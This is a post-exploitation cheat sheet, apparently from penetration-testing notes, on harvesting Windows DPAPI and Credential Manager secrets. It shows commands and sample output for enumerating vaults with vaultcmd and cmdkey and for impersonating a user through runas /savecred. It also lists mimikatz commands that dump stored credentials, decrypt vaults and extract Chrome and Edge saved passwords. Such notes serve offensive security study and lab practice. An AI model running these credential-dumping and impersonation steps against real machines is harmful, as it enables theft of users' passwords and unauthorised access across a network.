---
title: DPAPI
date: 2025-11-26 09:27:51
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Dump-Passwords
tags:
  - Dump-DPAPI
---

## Default Location

Credentials are stored in special encrypted folders on the computer under the user and system profiles :

  * `%UserProfile%\AppData\Local\Microsoft\Vault\`
  * `%UserProfile%\AppData\Local\Microsoft\Credentials\`
  * `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
  * `%ProgramData%\Microsoft\Vault\`
  * `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

## Two Main Types of Stored Credentials:

###### Web Credentials

  * Website passwords.
  * Online account logins

###### Windows Credentials

  * Network shares (like `\\server\share`)
  * Domain user logins
  * Services (OneDrive, etc.)
  * Remote desktop connections

## Enumerate All vaults

`➜ they are different, so we need to use both of them :`

For standard vaults

```powershell
PS C:\Users\sadams> vaultcmd /list

Currently loaded vaults:

	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault
```

For stored credentials

```powershell
PS C:\Temp> cmdkey /list

Currently stored credentials:

Target: WindowsLive: target=virtualapp/didlogical
Type: Generic
User: 02jejfxhvabjneqt
Local machine persistence

Target: LegacyGeneric: target=onedrive.live.com
Type: Generic
User: mcharles@inlanefreight.local

Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

Credentials marked with `Local machine persistence` survive reboots.

## Enumerate Specific vault

#### Web Credentials

```powershell
PS C:\Users\sadams> vaultcmd /listcreds:"Web Credentials" /all
```

#### Windows Credentials

```powershell
PS C:\Users\sadams> vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:interactive=SRV01\mcharles
Identity: SRV01\mcharles
Hidden: No
Roaming: No
Property (schema element id, value): (100,3)
```

`Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas`.

## Impersonate User ( In general, it doesn’t need admin privilege )

Since the `mcharles` credential is associated with an `interactive session`, we can attempt to impersonate the user using `runas` :

```powershell
C:\Users\sadams> runas /savecred /user:SRV01\mcharles powershell.exe

Attempting to start cmd as user "SRV01\mcharles" ...
```

➜ This will create a new `powershell` process.

## Dump Credentials

➜ We need `Local Administrator access on the machine`.

#### mimikatz

```powershell
# Dump all credentials from Credential Manager
sekurlsa::credman

# Dump credentials with more details
sekurlsa::vault

# List all credential vaults
dpapi::vault /list

# Decrypt specific vault
dpapi::vault /in:"C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol"

# Dump vault credentials
dpapi::vault /in:vaultfile /masterkey:masterkey

# Decrypt Chrome/Edge saved passwords
dpapi::chrome /in:"C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```
